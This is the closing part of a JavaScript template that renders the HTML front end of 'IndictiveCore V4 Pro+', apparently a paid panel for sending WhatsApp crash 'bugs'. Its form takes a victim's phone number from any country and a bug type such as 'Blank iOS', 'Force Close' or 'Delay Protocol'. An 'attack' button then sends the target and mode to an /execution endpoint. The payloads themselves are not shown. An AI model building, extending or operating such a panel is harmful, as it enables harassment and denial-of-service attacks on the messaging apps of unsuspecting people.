        </div>
        <div class="notification-progress"></div>
    </div>

    <div class="container">
        <div class="app-header fade-in" style="animation-delay: 0.1s;">
            <div class="app-title">EXECUTION | CORE</div>
            <div class="app-subtitle">Copyright by @AiiSigma</div>
        </div>

        <!-- ✅ ROLE STATUS INFO -->
        <div class="role-status fade-in" style="animation-delay: 0.15s;">
            <i class="fas ${userRole === 'vip' ? 'fa-crown' : 'fa-user'}"></i>
            <span>${statusMessage}</span>
        </div>

        <div id="senderInfo" class="sender-info">
            <i class="fas fa-info-circle"></i>
            <span id="senderInfoText"></span>
        </div>

        <div class="prime-card fade-in" style="animation-delay: 0.2s;">
            <div class="profile-banner-skew">
                <video autoplay loop muted playsinline>
                    <source src="https://files.catbox.moe/vgwc4k.mp4" type="video/mp4">
                    Browser Anda tidak mendukung tag video.
                </video>
                <div class="video-overlay"></div>
            </div>
            
            <div class="prime-name" id="username">${username || 'Loading...'}</div>
            
            <div class="prime-details">
                ${roleBadge}
                <div class="prime-exp">
                    <i class="fas fa-calendar-alt"></i>
                    <span id="expiredDate">${formattedTime}</span>
                </div>
            </div>
        </div>

        <div class="necro-card fade-in" style="animation-delay: 0.4s;">
            <div class="necro-title">IndictiveCore V4 Pro+</div>
            
            <form id="executionForm">
                <div class="form-group">
                    <label class="form-label"><i class="fas fa-crosshairs"></i> TARGET NUMBER</label>
                    <div class="input-wrapper">
                        <input type="tel" id="targetNumber" class="custom-input" placeholder="Enter phone number (628xxx)" required>
                        <i class="fas fa-phone-alt input-icon"></i>
                    </div>
                    <div style="font-size: 12px; color: var(--text-muted); margin-top: 5px;">
                        Support all countries: +1 (USA), +44 (UK), +62 (ID), +91 (IN), etc.
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label"><i class="fas fa-biohazard"></i> SELECT BUG TYPE</label>
                    <div class="select-wrapper">
                        <div class="select-btn">
                            <span class="selected-text">
                                <i class="fab fa-whatsapp"></i>
                                <span id="selectedOptionText">Select Bug Type</span>
                            </span>
                            <i class="fas fa-chevron-down arrow-dwn"></i>
                        </div>
                        <ul class="options-list" id="optionsList">
                            <li class="option" data-value="delay">
                                <i class="fa-solid fa-hourglass-half"></i>
                                <span>Delay Protocol</span>
                            </li>
                            <li class="option" data-value="blankios">
                                <i class="fab fa-apple"></i>
                                <span>Blank iOS</span>
                            </li>
                            <li class="option" data-value="androkill">
                                <i class="fab fa-android"></i>
                                <span>Android X-02N7 Ui</span>
                            </li>
                            <li class="option" data-value="forceclose">
                                <i class="fas fa-skull"></i>
                                <span>Force Close EexterNal</span>
                            </li>
                            <li class="option" data-value="fcinvsios">
                                <i class="fas fa-eye-slash"></i>
                                <span>InVisble iOS</span>
                            </li>
                        </ul>
                    </div>
                </div>
                
                <button type="submit" class="btn-attack" id="attackButton">
                    <span id="buttonText">LET'S GOOOO</span>
                    <i class="fas fa-paper-plane" style="margin-left: 8px;"></i>
                </button>
            </form>

            <div class="nav-buttons">
                <a href="/dashboard" class="btn-secondary">
                    <i class="fas fa-arrow-left"></i> Dashboard
                </a>
                ${userRole === 'user' ? 
                  '<a href="/my-senders" class="btn-secondary"><i class="fas fa-users"></i> My Senders</a>' : 
                  '<a href="/my-senders" class="btn-secondary"><i class="fas fa-list"></i> View Senders</a>'}
            </div>
        </div>
    </div>

    <script>
        // ==================== VARIABLES ==================== //
        let selectedBugType = '';
        let isDropdownOpen = false;
        let notificationTimeout = null;

        // ==================== NOTIFICATION SYSTEM ==================== //
        function showNotification(message, type = 'info') {
            const notification = document.getElementById('notification');
            const notificationText = document.getElementById('notificationText');
            const icon = notification.querySelector('.notification-content i');
            
            if (notificationTimeout) {
                clearTimeout(notificationTimeout);
                notification.classList.remove('show');
            }
            
            setTimeout(() => {
                notificationText.textContent = message;
                
                notification.classList.remove('error', 'success', 'warning', 'info');
                
                notification.classList.add(type);
                
                if (type === 'success') {
                    icon.className = 'fas fa-check-circle';
                } else if (type === 'warning') {
                    icon.className = 'fas fa-exclamation-triangle';
                } else if (type === 'error') {
                    icon.className = 'fas fa-times-circle';
                } else {
                    icon.className = 'fas fa-info-circle';
                }
                
                notification.classList.add('show');
                
                notificationTimeout = setTimeout(() => {
                    notification.classList.remove('show');
                }, 5000);
            }, 10);
        }

        // ==================== DROPDOWN FUNCTIONS ==================== //
        function toggleDropdown() {
            const selectBtn = document.querySelector('.select-btn');
            const optionsList = document.getElementById('optionsList');
            
            isDropdownOpen = !isDropdownOpen;
            
            if (isDropdownOpen) {
                selectBtn.classList.add('active');
                optionsList.classList.add('active');
            } else {
                selectBtn.classList.remove('active');
                optionsList.classList.remove('active');
            }
        }

        function selectBugType(option) {
            const value = option.getAttribute('data-value');
            const text = option.querySelector('span').textContent;
            const icon = option.querySelector('i').className;
            
            const selectedText = document.getElementById('selectedOptionText');
            selectedText.innerHTML = \`<i class="\${icon}"></i> \${text}\`;
            
            selectedBugType = value;
            
            toggleDropdown();
            
            showNotification(\`Bug type selected: \${text}\`, 'success');
            
            console.log('Bug type selected:', value);
        }

        function initializeDropdown() {
            const selectBtn = document.querySelector('.select-btn');
            const options = document.querySelectorAll('.option');
            const optionsList = document.getElementById('optionsList');
            
            if (!selectBtn || !optionsList) {
                console.error('Dropdown elements not found!');
                return;
            }
            
            selectBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                toggleDropdown();
            });
            
            options.forEach(option => {
                option.addEventListener('click', function(e) {
                    e.stopPropagation();
                    selectBugType(this);
                });
            });
            
            document.addEventListener('click', function(e) {
                if (isDropdownOpen && !selectBtn.contains(e.target) && !optionsList.contains(e.target)) {
                    toggleDropdown();
                }
            });
            
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && isDropdownOpen) {
                    toggleDropdown();
                }
            });
            
            console.log('Dropdown initialized successfully');
        }

        // ==================== FORM HANDLING ==================== //
        function validateForm() {
            const targetNumber = document.getElementById('targetNumber').value.trim();
            
            if (!targetNumber) {
                showNotification('Please enter target number!', 'error');
                return false;
            }
            
            const cleanTarget = targetNumber.replace(/\\D/g, '');
            if (cleanTarget.length < 8) {
                showNotification('Invalid phone number! Minimum 8 digits required', 'error');
                return false;
            }
            
            if (!selectedBugType) {
                showNotification('Please select bug type!', 'warning');
                return false;
            }
            
            return { target: cleanTarget, bugType: selectedBugType };
        }

        function submitForm() {
            const validation = validateForm();
            if (!validation) return;
            
            const { target, bugType } = validation;
            const attackButton = document.getElementById('attackButton');
            const buttonText = document.getElementById('buttonText');
            
            attackButton.disabled = true;
            buttonText.innerHTML = '<div class="loading"></div> Executing...';
            
            showNotification(\`Executing \${bugType} bug on \${target}...\`, 'info');
            
            setTimeout(() => {
                window.location.href = \`/execution?target=\${encodeURIComponent(target)}&mode=\${encodeURIComponent(bugType)}\`;
            }, 1000);
        }

        // ==================== INITIALIZE PAGE ==================== //
        function initializePage() {
            console.log('Initializing page...');
            
            setTimeout(() => {
                initializeDropdown();
            }, 100);
            
            const urlParams = new URLSearchParams(window.location.search);
            const justExecuted = urlParams.get('justExecuted');
            const target = urlParams.get('target');
            const mode = urlParams.get('mode');
            
            if (justExecuted === 'true' && target) {
                document.getElementById('targetNumber').value = target;
                
                if (mode) {
                    setTimeout(() => {
                        const option = document.querySelector(\`.option[data-value="\${mode}"]\`);
                        if (option) {
                            selectBugType(option);
                        }
                    }, 500);
                    
                    showNotification(\`Execution completed successfully! Target: \${target}\`, 'success');
                }
            }
            
            const form = document.getElementById('executionForm');
            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    submitForm();
                });
            }
            
            console.log('Page initialized successfully');
        }

        // ==================== EVENT LISTENERS ==================== //
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM fully loaded');
            initializePage();
        });

        // ==================== DEBUG HELPER ==================== //
        window.debugPage = function() {
            console.log('=== DEBUG INFO ===');
            console.log('Selected Bug Type:', selectedBugType);
            console.log('Dropdown Open:', isDropdownOpen);
            console.log('Form Elements:', {
                targetInput: document.getElementById('targetNumber'),
                selectBtn: document.querySelector('.select-btn'),
                optionsList: document.getElementById('optionsList'),
                options: document.querySelectorAll('.option').length
            });
        };
    </script>
</body>
</html>
`;
};